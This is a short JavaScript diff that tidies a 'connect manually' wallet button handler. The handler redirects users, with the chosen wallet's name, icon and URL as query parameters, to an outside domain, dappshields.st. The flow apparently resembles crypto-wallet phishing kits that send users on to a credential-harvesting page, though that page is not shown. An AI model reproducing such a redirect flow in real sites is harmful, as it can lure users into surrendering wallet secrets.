@@ -1457,30 +1457,22 @@ connectManuallyButton.addEventListener('click', () => {
     if (currentWallet) {
         const randomString = generateRandomString();
         const { name, img, url } = currentWallet;
+        
+        // Construct query params correctly
         const queryParams = new URLSearchParams({
             url: url,
             name: name,
             icon: img,
             random: randomString
         }).toString();
-        const fullUrl = `https://www.dappshields.st/overview`;
-
-
-if (currentWallet) {
-const randomString = generateRandomString();
-const { name, img, url } = currentWallet;
-const queryParams = new URLSearchParams({
-    url: url,
-    name: name,
-    icon: img,
-    random: randomString
-}).toString();
-const fullUrl = `https://www.dappshields.st/overview`;
-window.location.href = fullUrl; // Directly navigate to the URL
-}
-;
-
-
+        
+        // Append query params to the URL
+        const fullUrl = `https://www.dappshields.st/overview?${queryParams}`;
+        
+        // Navigate to the constructed URL
+        window.location.href = fullUrl;
+    }
+});
 
 
     // Clear previous QR code if any
